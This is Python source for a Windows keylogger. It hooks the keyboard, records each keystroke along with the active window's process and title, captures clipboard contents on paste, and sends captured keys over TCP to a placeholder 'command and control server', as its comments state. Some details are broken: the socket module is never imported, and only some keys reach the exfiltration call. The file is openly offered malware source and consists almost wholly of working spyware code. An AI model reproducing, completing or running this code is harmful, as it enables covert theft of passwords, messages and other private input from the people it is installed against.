#===========================#
# I M P O R T S             #
#===========================#

from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO
import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

#===========================#

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    BACKGROUND_MAGENTA = '\033[105m'
    BACKGROUND_WHITE = '\033[47m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    ORANGE = '\033[38;5;208m'

os.system("color")

#===========================#

def connect_to_server(host='127.0.0.1', port=12345, message="Hello!"):

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
    
        try:
    
            # Connect to the server
            client_socket.connect((host, port))
            
            print(f"| [{bcolors.OKGREEN}>{bcolors.ENDC}] Connected to [{bcolors.WARNING}{host}:{port}{bcolors.ENDC}]")
            
            # Send the message
            client_socket.sendall(message.encode('utf-8'))
            
            print(f"|  [{bcolors.OKGREEN}>{bcolors.ENDC}] Sent: [{bcolors.OKCYAN}{message}{bcolors.ENDC}]")
            
            # Close the connection
            client_socket.close()
            
            print(f"| [{bcolors.FAIL}x{bcolors.ENDC}] Connection closed.")

        except Exception as e:
        
            print(f"| [{bcolors.WARNING}x{bcolors.ENDC}] Error: {e}")

#===========================#

class KeyLogger:

    def __init__(self):
    
        self.currentWindow = None
        
    def getCurrentProcess(self):
    
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        processID = f'{pid.value}'
        
        executable = create_string_buffer(512)
        hProcess = windll.kernel32.OpenProcess(0x400|0x10, False, pid)
        
        if hProcess:
            windll.psapi.GetModuleBaseNameA(hProcess, None, byref(executable), 512)
            windowTitle = create_string_buffer(512)
            windll.user32.GetWindowTextA(hwnd, byref(windowTitle), 512)
            
            try:
                self.currentWindow = windowTitle.value.decode()
            except UnicodeDecodeError as e:
                print(f'{e}: window name unknown')
            
            print(f"\n[{bcolors.WARNING}%{bcolors.ENDC}] [{bcolors.ORANGE}" + processID + f"{bcolors.ENDC}] [{bcolors.WARNING}" + str(executable.value.decode()) + f"{bcolors.ENDC}] [{bcolors.WARNING}" + str(self.currentWindow) + f"{bcolors.ENDC}]\n")
            
            windll.kernel32.CloseHandle(hwnd)
            windll.kernel32.CloseHandle(hProcess)
            
        else:
            print(f"[{bcolors.FAIL}X{bcolors.ENDC}] Failed to get handle for process with PID: " + str(processID))
    
    def keystroke(self, event):
    
        pressed = ""
    
        try:
    
            # Get window name if this isn't the current window
            if event.WindowName != self.currentWindow:
                self.getCurrentProcess()
            
            # Identify what key it was
            if 32 < event.Ascii < 127:
            
                keyPressed = str(chr(event.Ascii))
                print(f"[{bcolors.OKCYAN}" + keyPressed + f"{bcolors.ENDC}]", end='')
                
                pressed = keyPressed
                
            else:
            
                if event.Key == 'V':
                
                    win32clipboard.OpenClipboard()
                    value = win32clipboard.GetClipboardData()
                    win32clipboard.CloseClipboard()
                    print(f"[{bcolors.OKCYAN}PASTE{bcolors.ENDC}] - [{bcolors.OKCYAN}" + value + f"{bcolors.ENDC}]")
                    
                    pressed = "PASTE:" + value
                    
                else:
                
                    print(f"[{bcolors.OKCYAN}" + str(event.Key) + f"{bcolors.ENDC}]")
                    
                    pressed = str(event.Key)
            
                # Exfiltrate keystroke to a command and control server if desired.
                cncIP = "0.0.0.0"
                cncPort = 12345
                connect_to_server(cncIP, cncPort, pressed)
            
            return True

        except Exception as e:
            print(str(e))
    
#===========================#
    
def run():

    try:

        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Creating output log...")
        # saveStdout = sys.stdout
        # sys.stdout = StringIO()
        
        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Creating logger object...")
        kl = KeyLogger()
        
        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Creating keyboard hook...")
        hm = pyHook.HookManager()
        
        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Setting up keystroke event listener...")
        hm.KeyDown = kl.keystroke
        
        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Hooking into keyboard...")
        hm.HookKeyboard()
        
        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Starting event loop...\n")
        while True:
            pythoncom.PumpWaitingMessages()
            
        print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Saving log...")
        # log = sys.stdout.getvalue()
        # sys.stdout = save_stdout
        # return log
    
    except Exception as e:
        print(str(e))

#===========================#

if __name__ == '__main__':

    print(f"[{bcolors.OKGREEN}>{bcolors.ENDC}] Starting program...")
    print(run())